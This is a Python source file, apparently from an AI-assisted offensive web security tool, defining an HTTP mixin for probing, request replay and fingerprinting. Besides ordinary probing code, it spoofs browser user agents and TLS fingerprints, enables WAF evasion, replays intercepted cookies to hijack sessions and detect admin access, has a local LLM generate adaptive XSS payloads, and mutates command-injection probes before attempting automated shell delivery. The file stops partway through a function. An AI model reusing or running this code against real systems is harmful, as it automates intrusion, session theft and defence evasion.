#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HTTP probes, request replay, fingerprinting, and target reachability."""

from interfaces.command_system.builtin.agent.workflow.imports import *  # noqa: F403


class HttpSurfaceMixin:
    """HTTP probes, request replay, fingerprinting, and target reachability."""

    def _network_error_markers(self) -> Tuple[str, ...]:
        return (
            "connection refused",
            "failed to establish a new connection",
            "max retries exceeded",
            "name or service not known",
            "temporary failure in name resolution",
            "nodename nor servname provided",
            "network is unreachable",
            "no route to host",
            "target is not reachable",
            "target not reachable",
            "connection timeout",
            "read timed out",
            "connect timeout",
            "connection aborted",
            "remote end closed connection",
        )

    def _agent_user_agent(self, state: AgentState) -> str:
        value = str(getattr(state, "user_agent", "") or "").strip()
        if value:
            return value
        
        # Spoofed user agents list
        chrome_uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        return random.choice(chrome_uas)

    def _create_spoofed_ssl_context(self, state: Optional[AgentState] = None) -> Any:
        policy = getattr(state, "runtime_policy", None) if state is not None else None
        if policy is not None and not getattr(policy, "tls_verify", True):
            ctx = ssl._create_unverified_context()
        else:
            cafile = getattr(policy, "tls_ca_bundle", None) if policy is not None else None
            ctx = ssl.create_default_context(cafile=cafile)
        # Chrome JA3-like ciphers
        ctx.set_ciphers('TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA')
        try:
            ctx.set_ecdh_curve('prime256v1')
        except Exception:
            pass
        return ctx

    def _agent_http_headers(self, state: AgentState) -> Dict[str, str]:
        return {"User-Agent": self._agent_user_agent(state)}

    async def _async_http_probe_one(
        self,
        state: AgentState,
        session: Any,
        url: str,
        timeout_s: float,
        read_bytes: int,
    ) -> Dict[str, Any]:
        try:
            guard = getattr(state, "scope_guard", None)
            if guard is not None:
                allowed, reason = guard.validate_url(url)
                if not allowed:
                    return {"url": url, "status": 0, "headers": {}, "body": "", "final_url": "", "error": reason}
            async with session.get(url, timeout=timeout_s, allow_redirects=False) as response:
                raw = await response.content.read(read_bytes)
                return {
                    "url": url,
                    "status": int(response.status or 0),
                    "headers": {str(k).lower(): str(v) for k, v in response.headers.items()},
                    "body": raw.decode("utf-8", errors="ignore"),
                    "final_url": str(response.url),
                    "error": "",
                }
        except Exception as exc:
            return {"url": url, "status": 0, "headers": {}, "body": "", "final_url": "", "error": str(exc)}

    async def _async_http_probe_many(
        self,
        state: AgentState,
        urls: List[str],
        timeout_s: float = 4.0,
        read_bytes: int = 8192,
    ) -> List[Dict[str, Any]]:
        timeout = aiohttp.ClientTimeout(total=timeout_s) if HAS_AIOHTTP else None
        headers = self._agent_http_headers(state)
        policy = getattr(state, "runtime_policy", None)
        connector = None
        if policy is not None:
            connector = aiohttp.TCPConnector(
                ssl=self._create_spoofed_ssl_context(state)
                if getattr(policy, "tls_verify", True)
                else False
            )
        async with aiohttp.ClientSession(headers=headers, timeout=timeout, connector=connector) as session:
            tasks = [self._async_http_probe_one(state, session, url, timeout_s, read_bytes) for url in urls]
            return list(await asyncio.gather(*tasks))

    def _run_async_http_probe_many(
        self,
        state: AgentState,
        urls: List[str],
        timeout_s: float = 4.0,
        read_bytes: int = 8192,
    ) -> Optional[List[Dict[str, Any]]]:
        if not getattr(state, "async_probes", False) or not HAS_AIOHTTP or not urls:
            return None
        try:
            return asyncio.run(self._async_http_probe_many(state, urls, timeout_s, read_bytes))
        except RuntimeError:
            loop = asyncio.new_event_loop()
            try:
                return loop.run_until_complete(self._async_http_probe_many(state, urls, timeout_s, read_bytes))
            finally:
                loop.close()
        except Exception as exc:
            if getattr(state, "verbose", False):
                print_warning(f"Async probe failed, falling back to urllib: {exc}")
            return None

    def _sync_http_probe_one(
        self,
        state: AgentState,
        url: str,
        timeout_s: float = 4.0,
        read_bytes: int = 8192,
    ) -> Dict[str, Any]:
        request = urllib.request.Request(
            url,
            headers=self._agent_http_headers(state),
            method="GET",
        )
        try:
            guard = getattr(state, "scope_guard", None)
            if guard is not None:
                allowed, reason = guard.validate_url(url)
                if not allowed:
                    raise PermissionError(reason)
            consume_network_request(f"GET {url}")

            class _NoRedirect(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, req, fp, code, msg, headers, newurl):
                    return None

            handlers = [_NoRedirect()]
            if url.startswith("https://"):
                ctx = self._create_spoofed_ssl_context(state)
                handlers.append(urllib.request.HTTPSHandler(context=ctx))
            opener = urllib.request.build_opener(*handlers)
            with opener.open(request, timeout=timeout_s) as response:
                body = response.read(read_bytes).decode("utf-8", errors="ignore")
                return {
                    "url": url,
                    "status": int(getattr(response, "status", 0) or response.getcode() or 0),
                    "headers": {k.lower(): str(v) for k, v in response.headers.items()},
                    "body": body,
                    "final_url": str(response.geturl() or ""),
                    "error": "",
                }
        except urllib.error.HTTPError as exc:
            try:
                body = exc.read(read_bytes).decode("utf-8", errors="ignore")
            except Exception:
                body = ""
            return {
                "url": url,
                "status": int(exc.code or 0),
                "headers": {k.lower(): str(v) for k, v in (exc.headers.items() if exc.headers else [])},
                "body": body,
                "final_url": str(getattr(exc, "url", "") or ""),
                "error": "",
            }
        except Exception as exc:
            return {"url": url, "status": 0, "headers": {}, "body": "", "final_url": "", "error": str(exc)}

    def _http_probe_many(
        self,
        state: AgentState,
        urls: List[str],
        timeout_s: float = 4.0,
        read_bytes: int = 8192,
    ) -> List[Dict[str, Any]]:
        if not urls:
            return []

        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        cache = kb.setdefault("http_probe_cache", {})
        key_to_url: Dict[str, str] = {}
        output_by_key: Dict[str, Dict[str, Any]] = {}
        ordered_keys: List[str] = []

        for raw_url in urls:
            key = self._normalize_probe_url(raw_url)
            ordered_keys.append(key)
            key_to_url.setdefault(key, raw_url)
            cached = cache.get(key) if isinstance(cache, dict) else None
            if isinstance(cached, dict):
                row = dict(cached)
                row["cached"] = True
                output_by_key[key] = row

        fetch_keys = [key for key in key_to_url.keys() if key not in output_by_key]
        fetch_urls = [key_to_url[key] for key in fetch_keys]
        if fetch_urls:
            remaining = self._request_budget_remaining(state)
            if remaining is not None:
                allowed_count = max(0, min(len(fetch_urls), remaining))
                skipped_urls = fetch_urls[allowed_count:]
                fetch_keys = fetch_keys[:allowed_count]
                fetch_urls = fetch_urls[:allowed_count]
                for skipped_url in skipped_urls:
                    key = self._normalize_probe_url(skipped_url)
                    budget = getattr(state, "network_budget", None)
                    if budget is not None:
                        budget.record_skipped(1)
                    else:
                        state.metrics.network_units_skipped += 1
                    output_by_key[key] = {
                        "url": skipped_url,
                        "status": 0,
                        "headers": {},
                        "body": "",
                        "final_url": "",
                        "error": "request budget exhausted before HTTP probe",
                    }

        fetched_rows: List[Dict[str, Any]] = []
        if fetch_urls:
            async_rows = self._run_async_http_probe_many(state, fetch_urls, timeout_s, read_bytes)
            if async_rows is not None:
                fetched_rows = async_rows
            else:
                for url in fetch_urls:
                    self._sleep_between_agent_actions(state, f"http-probe:{url}")
                    fetched_rows.append(self._sync_http_probe_one(state, url, timeout_s, read_bytes))

        for key, row in zip(fetch_keys, fetched_rows):
            normalized_row = dict(row)
            normalized_row["cached"] = False
            output_by_key[key] = normalized_row
            if isinstance(cache, dict) and not normalized_row.get("error"):
                cache[key] = {
                    "url": normalized_row.get("url"),
                    "status": normalized_row.get("status"),
                    "headers": normalized_row.get("headers") or {},
                    "body": str(normalized_row.get("body", "") or "")[:read_bytes],
                    "final_url": normalized_row.get("final_url") or "",
                    "error": "",
                }

        kb["http_probe_cache"] = cache
        state.knowledge_base = kb
        return [
            output_by_key.get(
                key,
                {"url": key_to_url.get(key, key), "status": 0, "headers": {}, "body": "", "final_url": "", "error": ""},
            )
            for key in ordered_keys
        ]

    def _normalize_probe_url(self, url: str) -> str:
        try:
            parsed = urllib.parse.urlsplit(str(url or "").strip())
            scheme = parsed.scheme.lower()
            host = (parsed.hostname or "").lower()
            port = parsed.port
            netloc = host
            if port and not ((scheme == "http" and port == 80) or (scheme == "https" and port == 443)):
                netloc = f"{host}:{port}"
            path = parsed.path or "/"
            query = f"?{parsed.query}" if parsed.query else ""
            return urllib.parse.urlunsplit((scheme, netloc, path, query, ""))
        except Exception:
            return str(url or "").strip()

    def _build_agent_http_request_url(self, state: AgentState, path_or_url: str) -> str:
        from interfaces.command_system.builtin.agent.http_probe_actions import build_agent_http_request_url

        return build_agent_http_request_url(state, path_or_url)

    def _execute_agent_http_request_action(self, state: AgentState, action: Dict[str, Any]) -> Dict[str, Any]:
        from interfaces.command_system.builtin.agent.http_probe_actions import execute_agent_http_request

        return execute_agent_http_request(
            state,
            action,
            headers=self._agent_http_headers(state),
            sleep_fn=lambda: self._sleep_between_agent_actions(
                state, f"llm-http:{str((action.get('options') or {}).get('method') or 'GET').upper()} {action.get('path')}"
            ),
            ssl_context_fn=lambda: self._create_spoofed_ssl_context(state),
            consume_network=lambda units, reason: self._consume_network_units(state, units, reason=reason),
        )

    def _execute_plan_http_requests(self, state: AgentState, actions: List[Dict[str, Any]], budget: int) -> List[Dict[str, Any]]:
        from interfaces.command_system.builtin.agent.http_probe_actions import (
            MAX_HTTP_REQUESTS_PER_TURN,
            execute_plan_http_requests,
        )

        selected_budget = max(0, min(int(budget or 0), MAX_HTTP_REQUESTS_PER_TURN))
        if selected_budget <= 0:
            return []
        http_count = sum(
            1 for action in actions
            if isinstance(action, dict) and str(action.get("type", "")).lower() == "http_request"
        )
        if http_count:
            print_status(f"Execution plan HTTP request: running up to {min(http_count, selected_budget)} request(s)")
        return execute_plan_http_requests(
            state,
            actions,
            selected_budget,
            headers=self._agent_http_headers(state),
            sleep_fn=lambda action: self._sleep_between_agent_actions(
                state,
                f"llm-http:{str((action.get('options') or {}).get('method') or 'GET').upper()} {action.get('path')}",
            ),
            ssl_context_fn=lambda: self._create_spoofed_ssl_context(state),
            consume_network=lambda units, reason: self._consume_network_units(state, units, reason=reason),
            max_per_turn=MAX_HTTP_REQUESTS_PER_TURN,
        )

    def _execute_plan_surface_scans(self, state: AgentState, actions: List[Dict[str, Any]], budget: int) -> List[Dict[str, Any]]:
        selected = [
            action for action in actions
            if isinstance(action, dict) and str(action.get("type", "")).lower() == "surface_scan"
        ]
        if not selected or budget <= 0:
            return []
        action = selected[0]
        options = self._sanitize_surface_scan_action_options(action.get("options", {}))
        limit = max(1, min(int(options.get("limit") or 6), int(budget or 1)))
        all_modules = self._catalog.discover_campaign_modules(
            expanded=bool(getattr(state, "expanded_surface", False))
        )
        modules = [
            module for module in self._select_modules_for_target(state, all_modules)
            if str(module.get("path", "")).startswith(("scanner/", "auxiliary/scanner/"))
        ]
        protocol = str(options.get("protocol") or getattr(state, "protocol", "") or "").strip().lower()
        if protocol:
            modules = self._filter_modules_by_protocol(modules, protocol=protocol)
        tags = options.get("tags") if isinstance(options.get("tags"), list) else []
        if tags:
            tag_set = {str(t).lower() for t in tags}
            modules = [
                module for module in modules
                if tag_set.intersection({str(t).lower() for t in module.get("tags", []) or []})
                or any(tag in str(module.get("path", "")).lower() for tag in tag_set)
            ]
        observed = {
            str(path).strip()
            for path in (state.knowledge_base or {}).get("observed_modules", [])
            if str(path).strip()
        }
        modules = [
            module for module in modules
            if str(module.get("path", "")).strip() not in observed
        ]
        if not modules:
            return []
        tech_hints = {
            str(x).lower()
            for x in (state.knowledge_base or {}).get("tech_hints", []) or []
        }
        selected_modules = self._select_modules_opportunistic(
            modules,
            state,
            tech_hints,
            observed,
            limit,
        ) or modules[:limit]
        if not selected_modules:
            return []
        print_status(
            f"Execution plan surface scan: running {len(selected_modules)} scanner module(s)"
        )
        scanner = state.scanner
        results = self._execute_agent_modules(
            state,
            scanner,
            selected_modules,
            state.target_info,
            1 if state.verbose or self._discreet_mode(state) else max(1, min(int(state.threads or 1), 4)),
            bool(state.verbose),
            "surface-scan",
        )
        selected_paths = [m.get("path") for m in selected_modules if m.get("path")]
        self._remember_planner_actions(
            state.knowledge_base,
            selected_paths,
            {
                str(row.get("path", "")).strip()
                for row in results
                if isinstance(row, dict) and str(row.get("status", "")).lower() in {"error", "skipped"}
            },
        )
        self._append_timeline_event(
            state,
            "surface-scan",
            f"LLM requested scanner -u style overview ({len(selected_modules)} module(s)).",
            modules=selected_modules,
            results=results,
        )
        return results

    def _action_delay_bounds(self, state: AgentState) -> Tuple[float, float]:
        try:
            delay_min = max(0.0, float(getattr(state, "request_delay_min", 0.0) or 0.0))
        except Exception:
            delay_min = 0.0
        try:
            delay_max = max(0.0, float(getattr(state, "request_delay_max", 0.0) or 0.0))
        except Exception:
            delay_max = 0.0
        if delay_max < delay_min:
            delay_max = delay_min
        return delay_min, delay_max

    def _throttle_active_web_probe(self, state: AgentState, path: str) -> None:
        """Per-request spacing for direct surface probes (avoids 10+ GET burst)."""
        delay_min, delay_max = self._action_delay_bounds(state)
        if delay_max <= 0:
            if self._discreet_mode(state):
                time.sleep(random.uniform(0.45, 0.95))
            else:
                time.sleep(random.uniform(0.25, 0.55))
            return
        self._sleep_between_agent_actions(state, f"active-probe:{path}")

    def _sleep_between_agent_actions(self, state: AgentState, context: str = "") -> None:
        delay_min, delay_max = self._action_delay_bounds(state)
        if delay_max <= 0:
            return
        delay = random.uniform(delay_min, delay_max)
        if delay <= 0:
            return
        if getattr(state, "verbose", False):
            suffix = f" before {context}" if context else ""
            print_info(f"Rate limit: sleeping {delay:.2f}s{suffix}")
        time.sleep(delay)

    def _has_proxy_request_intel(self, state: AgentState) -> bool:
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        intel = kb.get("request_intel", {}) if isinstance(kb.get("request_intel", {}), dict) else {}
        try:
            return int(intel.get("analyzed_flows", 0) or 0) > 0
        except Exception:
            return False

    def _merge_http_request_intel_into_kb(self, state: AgentState, summary: Dict[str, Any]) -> None:
        if not isinstance(summary, dict) or not isinstance(state.knowledge_base, dict):
            return
        kb = state.knowledge_base
        kb["request_intel"] = summary

        endpoints = set(kb.get("discovered_endpoints", []) or [])
        endpoints.update(str(x) for x in summary.get("discovered_endpoints", []) or [] if str(x).strip())
        kb["discovered_endpoints"] = sorted(endpoints)[:300]

        params = set(kb.get("discovered_params", []) or [])
        params.update(str(x).lower() for x in summary.get("discovered_params", []) or [] if str(x).strip())
        kb["discovered_params"] = sorted(params)[:200]

        login_paths = set(kb.get("login_paths", []) or [])
        login_paths.update(str(x) for x in summary.get("login_paths", []) or [] if str(x).startswith("/"))
        kb["login_paths"] = sorted(login_paths)[:40]

        tech_hints = set(kb.get("tech_hints", []) or [])
        for hint in summary.get("tech_hints", []) or []:
            hint_lower = str(hint or "").lower().strip()
            if hint_lower:
                tech_hints.add(hint_lower)
                if hint_lower in ("wordpress", "drupal", "joomla", "django", "flask", "nodejs", "nextjs", "api"):
                    self._update_tech_confidence(kb, hint_lower, 0.25)
                elif hint_lower in ("graphql", "swagger", "react", "angular", "vue", "phpmyadmin", "dvwa"):
                    self._update_tech_confidence(kb, hint_lower, 0.18)
        kb["tech_hints"] = sorted(tech_hints)

        risk = set(kb.get("risk_signals", []) or [])
        risk.update(str(x) for x in summary.get("risk_signals", []) or [] if str(x).strip())
        kb["risk_signals"] = sorted(risk)

        if getattr(state, "reuse_proxy_auth", False):
            auth_context = summary.get("auth_context", {})
            if isinstance(auth_context, dict) and auth_context:
                self._merge_auth_context(kb, auth_context, state=state)
                risk.add("session_cookie_observed")
                risk.add("authenticated_session")
                kb["risk_signals"] = sorted(risk)

        if summary.get("dom_xss_potential"):
            kb["dom_xss_potential"] = summary["dom_xss_potential"]
            risk = set(kb.get("risk_signals", []) or [])
            if any(x.get("is_likely_vulnerable") for x in summary["dom_xss_potential"]):
                risk.add("potential_dom_xss_detected")
            kb["risk_signals"] = sorted(risk)

        if summary.get("login_fidelity"):
            kb["login_fidelity"] = summary["login_fidelity"]
            for path, fidelity in summary["login_fidelity"].items():
                if fidelity.get("fidelity_class") == "low":
                    risk = set(kb.get("risk_signals", []) or [])
                    risk.add("suspicious_login_page_detected")
                    kb["risk_signals"] = sorted(risk)
                    break

        if summary.get("extracted_secrets"):
            kb["extracted_secrets"] = summary["extracted_secrets"]
            risk = set(kb.get("risk_signals", []) or [])
            risk.add("leaked_secrets_detected")
            caps = set(kb.get("unlocked_capabilities", []) or [])
            for secret in summary["extracted_secrets"]:
                if secret["type"] in ("jwt", "bearer_token"):
                    caps.add("session_cookie")
                elif secret["type"] == "aws_key":
                    caps.add("cloud_credentials")
            kb["unlocked_capabilities"] = sorted(caps)
            kb["risk_signals"] = sorted(risk)

        if summary.get("timing_anomalies"):
            kb["timing_anomalies"] = summary["timing_anomalies"]
            risk = set(kb.get("risk_signals", []) or [])
            risk.add("timing_side_channel_detected")
            kb["risk_signals"] = sorted(risk)

        if summary.get("active_probe"):
            risk = set(kb.get("risk_signals", []) or [])
            risk.add("active_web_probe_completed")
            kb["risk_signals"] = sorted(risk)

        self._promote_corroborated_web_apps(kb)
        state.knowledge_base = kb

    def _resolve_active_probe_paths_for_state(
        self,
        state: AgentState,
        *,
        extra_paths: Optional[List[str]] = None,
        limit: int = 14,
    ) -> Tuple[List[str], str]:
        shell_mode = (
            is_shell_operator_goal(self._operator_campaign_goal(state))
            or bool(getattr(state, "shell_hunter", False))
        )
        return resolve_active_probe_paths(
            shell_mode=shell_mode,
            intrusive_approved=self._shell_sensitive_probes_allowed(state),
            extra_paths=extra_paths,
            limit=limit,
        )

    def _active_web_probe_result(self, row: Dict[str, Any]) -> Dict[str, Any]:
        if not isinstance(row, dict):
            row = {}
        path = row.get("path") or row.get("url") or ""
        status = str(row.get("status") or "ok")
        if status == "ok":
            message = (
                f"Active web probe GET {path} -> {row.get('status_code')} "
                f"({row.get('response_length', 0)} bytes) "
                f"[{', '.join(row.get('reasons', [])[:3])}]"
            )
            result_status = "safe"
        elif status == "blocked":
            message = f"Active web probe blocked for {path}: {row.get('error', '')}"
            result_status = "skipped"
        else:
            message = f"Active web probe failed for {path}: {row.get('error', 'unknown error')}"
            result_status = "error"
        return {
            "module": "Active web surface probe",
            "path": "agent/active_web_probe",
            "status": result_status,
            "vulnerable": False,
            "severity": "info",
            "message": message,
            "details": dict(row),
        }

    def _run_active_web_surface_probe(
        self,
        state: AgentState,
        *,
        extra_paths: Optional[List[str]] = None,
        max_requests: int = 12,
    ) -> Tuple[Dict[str, Any], List[Dict[str, Any]]]:
        """Send direct GET probes when proxy traffic is thin or shell goal needs more surface."""
        if state.dry_run:
            return {}, []
        if state.target_reachable is False:
            return {}, []

        def _budget() -> bool:
            return self._consume_network_units(state, 1)

        paths, tier = self._resolve_active_probe_paths_for_state(
            state,
            extra_paths=extra_paths,
            limit=max(1, int(max_requests or 1)),
        )
        summary = self._http_intel.probe_direct_surface(
            state.target_info or {},
            probe_paths=paths,
            limit=len(paths),
            user_agent=str(getattr(state, "user_agent", "") or ""),
            on_request=_budget,
            on_throttle=lambda probe_path: self._throttle_active_web_probe(state, probe_path),
        )
        summary["probe_tier"] = tier
        analyzed = int(summary.get("analyzed_flows", 0) or 0)
        if analyzed <= 0:
            return summary, []

        self._merge_http_request_intel_into_kb(state, summary)
        results = [self._active_web_probe_result(row) for row in (summary.get("probe_results") or []) if isinstance(row, dict)]
        self._append_timeline_event(
            state,
            "request-intel",
            (
                f"Active web probe: {analyzed} GET request(s), "
                f"{len(summary.get('discovered_endpoints', []) or [])} endpoint hint(s)."
            ),
            kind="probe",
            extra={"interesting": len(summary.get("interesting_requests", []) or [])},
        )
        return summary, results

    def _http_request_intel_result(self, row: Dict[str, Any]) -> Dict[str, Any]:
        if not isinstance(row, dict):
            row = {}
        status = str(row.get("status") or "ok")
        status_code = row.get("status_code")
        path = row.get("path") or row.get("url") or ""
        if status == "ok":
            message = (
                f"Verified captured HTTP request {row.get('method', 'GET')} {path} "
                f"-> {status_code} ({row.get('response_length', 0)} bytes)"
            )
            result_status = "safe"
        elif status == "skipped":
            message = f"Skipped captured HTTP request {path}: {row.get('error', 'not eligible')}"
            result_status = "skipped"
        else:
            message = f"Captured HTTP request replay failed for {path}: {row.get('error', 'unknown error')}"
            result_status = "error"
        return {
            "module": "HTTP request intelligence",
            "path": "agent/http_request_intel",
            "status": result_status,
            "vulnerable": False,
            "severity": "info",
            "message": message,
            "details": dict(row),
        }

    def _run_http_request_replay(self, state: AgentState, summary: Dict[str, Any]) -> List[Dict[str, Any]]:
        mode = str(getattr(state, "http_replay", "safe") or "safe").strip().lower()
        if mode == "off":
            return []
        candidates = [
            row for row in (summary.get("candidate_requests", []) or [])
            if isinstance(row, dict)
        ]
        if mode == "safe":
            candidates = [row for row in candidates if row.get("replay_safe")]
        if not candidates:
            return []

        max_replay = max(0, int(getattr(state, "http_replay_max", 3) or 0))
        if is_shell_operator_goal(self._operator_campaign_goal(state)):
            max_replay = max(max_replay, 8)
        if max_replay <= 0:
            return []
        selected = candidates[:max_replay]
        sent_rows: List[Dict[str, Any]] = []
        results: List[Dict[str, Any]] = []

        print_status(f"HTTP request intelligence: replaying {len(selected)} captured request candidate(s)")
        for candidate in selected:
            if not self._consume_network_units(state, 1):
                row = {
                    "status": "skipped",
                    "flow_id": candidate.get("flow_id"),
                    "method": candidate.get("method"),
                    "url": candidate.get("url"),
                    "path": candidate.get("path"),
                    "error": "request budget exhausted before HTTP replay",
                }
            else:
                self._sleep_between_agent_actions(
                    state,
                    f"http-replay:{candidate.get('path') or candidate.get('url')}",
                )
                kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
                waf_detected = "waf_or_blocking_detected" in kb.get("risk_signals", [])
                
                row = self._http_intel.send_candidate(
                    candidate,
                    mode=mode,
                    timeout=8.0,
                    include_sensitive_headers=bool(getattr(state, "reuse_proxy_auth", False)),
                    evasion=waf_detected,
                )
            sent_rows.append(row)
            results.append(self._http_request_intel_result(row))
            if self._record_waf_signals_from_results(
                state,
                [{
                    "status_code": row.get("status_code"),
                    "body": "",
                    "details": row,
                }],
                "http-request-intel",
            ):
                break

            # Session Hijacking Test
            if mode == "active" and row.get("status") == "ok" and candidate.get("has_sensitive_headers"):
                headers = candidate.get("headers", {})
                cookies = self._http_intel._parse_cookie_header(self._http_intel._header_value(headers, "Cookie"))
                if cookies:
                    print_status("HTTP request intelligence: testing intercepted session cookies validity...")
                    session_results = self._http_intel.test_session_validity(cookies, candidate.get("url"))
                    if session_results:
                        for ep, s_res in session_results.items():
                            print_success(f"Session hijacked: accessed {ep} (is_admin={s_res['is_admin']})")
                            kb = state.knowledge_base
                            caps = set(kb.get("unlocked_capabilities", []) or [])
                            caps.add("session_cookie")
                            if s_res["is_admin"]:
                                caps.add("admin_access")
                            kb["unlocked_capabilities"] = sorted(caps)
                            state.knowledge_base = kb
                            results.append({
                                "module": "Session Hijacking",
                                "path": "agent/session_hijack",
                                "status": "vulnerable",
                                "vulnerable": True,
                                "severity": "high",
                                "message": f"Successfully hijacked session to access {ep}",
                                "details": s_res
                            })

            # Active Canary Probing for DOM XSS
            if mode == "active" and candidate.get("dom_xss_potential"):
                for xss in candidate["dom_xss_potential"]:
                    if not xss.get("is_likely_vulnerable"):
                        continue
                    param = xss.get("param")
                    if not param:
                        continue
                    
                    if not self._consume_network_units(state, 1):
                        break
                        
                    print_status(f"HTTP request intelligence: triggering canary probe for parameter `{param}`")
                    canary_res = self._http_intel.probe_reflection_canary(candidate, param, mode=mode)
                    if canary_res.get("reflection_confirmed"):
                        print_success(f"DOM XSS confirmation: canary reflected for `{param}` in {canary_res.get('canary_contexts', [])}")
                        results.append({
                            "module": "DOM XSS Confirmation",
                            "path": "agent/dom_xss_canary",
                            "status": "vulnerable",
                            "vulnerable": True,
                            "severity": "high",
                            "message": f"Confirmed reflection for parameter `{param}` in {canary_res.get('canary_contexts', [])}",
                            "details": canary_res
                        })
                        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
                        risk = set(kb.get("risk_signals", []) or [])
                        risk.add("confirmed_dom_xss")
                        kb["risk_signals"] = sorted(risk)
                        state.knowledge_base = kb

                    # Adaptive LLM Payload
                    if (
                        xss.get("contexts")
                        and getattr(state, "llm_local", False)
                        and not llm_budget_exhausted(state)
                    ):
                        context_str = ", ".join(xss["contexts"])
                        llm_model = resolve_llm_model(state)
                        self._http_intel.configure_llm(
                            endpoint=state.llm_endpoint,
                            model=llm_model,
                        )
                        state.metrics.llm_calls += 1
                        llm_payload = self._http_intel.generate_adaptive_payload(
                            context_str,
                            param,
                            llm_endpoint=state.llm_endpoint,
                            llm_model=llm_model,
                        )
                        if llm_payload:
                            if not self._consume_network_units(state, 1):
                                break
                            print_status(f"HTTP request intelligence: triggering LLM-crafted payload probe for `{param}`")
                            llm_res = self._http_intel.probe_reflection_canary(candidate, param, canary=llm_payload, mode=mode)
                            if llm_res.get("reflection_confirmed"):
                                print_success(f"Confirmed XSS with LLM payload: `{llm_payload[:40]}`")
                                results.append({
                                    "module": "LLM Adaptive XSS",
                                    "path": "agent/llm_xss_probe",
                                    "status": "vulnerable",
                                    "vulnerable": True,
                                    "severity": "critical",
                                    "message": f"Confirmed XSS for parameter `{param}` using LLM payload",
                                    "details": llm_res
                                })

            # Shell Hunter: Command Injection Probing
            rce_markers = ("command injection", "command injection candidate", "rce")
            if state.shell_hunter and mode == "active" and any(
                r in (row.get("reasons", []) or []) for r in rce_markers
            ):
                param = next(iter(candidate.get("params", {}).keys()), None)
                if param:
                    from interfaces.command_system.builtin.agent.http_intelligence import PayloadMutationEngine
                    mutator = PayloadMutationEngine()
                    mutated = mutator.mutate_command("echo ksploit_rce_check")
                    for mut_payload in mutated[:5]:
                        if not self._consume_network_units(state, 1):
                            break
                        print_status(f"Shell Hunter: triggering mutated RCE probe for `{param}` -> `{mut_payload}`")
                        mut_res = self._http_intel.probe_reflection_canary(candidate, param, canary=mut_payload, mode=mode)
                        if mut_res.get("status") == "ok" and "ksploit_rce_check" in mut_res.get("response_body", ""):
                            print_success(f"Shell Hunter: CONFIRMED RCE for `{param}` with payload `{mut_payload}`")
                            results.append({
                                "module": "RCE Confirmation",
                                "path": "agent/rce_mutation_probe",
                                "status": "vulnerable",
                                "vulnerable": True,
                                "severity": "critical",
                                "message": f"Confirmed RCE for parameter `{param}` with payload `{mut_payload}`",
                                "details": mut_res
                            })
                            # Attempt automated shell delivery
                            shell_res = self._attempt_shell_delivery(state, candidate, param)
                            if shell_res:
                                results.append(shell_res)
                            break

        summary["sent_requests"] = sent_rows[:12]
        if isinstance(state.knowledge_base, dict):
            state.knowledge_base["request_intel"] = summary
        return results

    def _ingest_http_request_intelligence(self, state: AgentState) -> List[Dict[str, Any]]:
        if state.shell_hunter:
            kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
            kb["shell_hunter_mode"] = True
            state.knowledge_base = kb

        proxy_enabled = bool(getattr(state, "proxy_flows", True))
        if proxy_enabled:
            summary = self._http_intel.collect_from_proxy(
                state.target_info or {},
                limit=max(0, int(getattr(state, "proxy_flow_limit", 40) or 0)),
                include_auth_context=bool(getattr(state, "reuse_proxy_auth", False)),
            )
            if not isinstance(summary, dict):
                summary = self._http_intel.empty_summary(enabled=True)
            if summary.get("error") and getattr(state, "verbose", False):
                print_warning(str(summary.get("error")))
        else:
            summary = self._http_intel.empty_summary(enabled=True)
            summary["source"] = "proxy_disabled"

        proxy_flows = int(summary.get("analyzed_flows", 0) or 0)
        if proxy_flows > 0:
            self._merge_http_request_intel_into_kb(state, summary)

        operator_shell = is_shell_operator_goal(self._operator_campaign_goal(state))
        shell_hunter = bool(getattr(state, "shell_hunter", False))
        shell_mode = operator_shell or shell_hunter
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        endpoint_count = len(kb.get("discovered_endpoints", []) or [])
        active_results: List[Dict[str, Any]] = []

        should_active_probe = proxy_flows <= 0 or (shell_mode and endpoint_count < 8)
        if should_active_probe:
            if proxy_flows <= 0 and getattr(state, "verbose", False):
                if shell_mode and self._shell_sensitive_probes_allowed(state):
                    print_info(
                        "HTTP intelligence: no KittyProxy flows; active GET probes "
                        "(safe + shell-tier paths approved)."
                    )
                elif shell_mode:
                    print_info(
                        "HTTP intelligence: no KittyProxy flows; active GET probes "
                        "(safe paths only — use --approve-risk intrusive for /.env, /phpinfo, etc.)."
                    )
                else:
                    print_info("HTTP intelligence: no KittyProxy flows; sending safe GET surface probes.")
            if shell_mode and self._shell_sensitive_probes_allowed(state):
                probe_limit = 18
            elif shell_mode:
                probe_limit = 14
            else:
                # Reserve slots for colocated panels (phpMyAdmin/Roundcube/…) even on CMS sites.
                probe_limit = 16
            active_summary, active_results = self._run_active_web_surface_probe(
                state,
                max_requests=probe_limit,
            )
